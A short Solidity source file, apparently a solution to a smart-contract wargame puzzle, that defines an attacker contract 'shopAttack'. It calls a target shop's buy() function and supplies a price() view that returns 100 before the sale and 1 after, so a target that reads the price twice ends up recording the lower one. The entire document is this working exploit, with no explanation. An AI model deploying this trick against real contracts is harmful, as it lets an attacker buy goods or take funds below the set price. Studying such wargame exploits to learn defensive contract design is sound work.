
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Ishop {
    function buy() external;
    function isSold() external view returns (bool);

    
    }
contract shopAttack{
    Ishop public target;

    constructor (address _target) {
        target = Ishop (_target);

    }
    function attack() external {
        target.buy
        ();
    }
    function price () external view returns (uint) {
         if (target.isSold()) {
            return 1;
         } else {
            return 100;
         }
    }
}
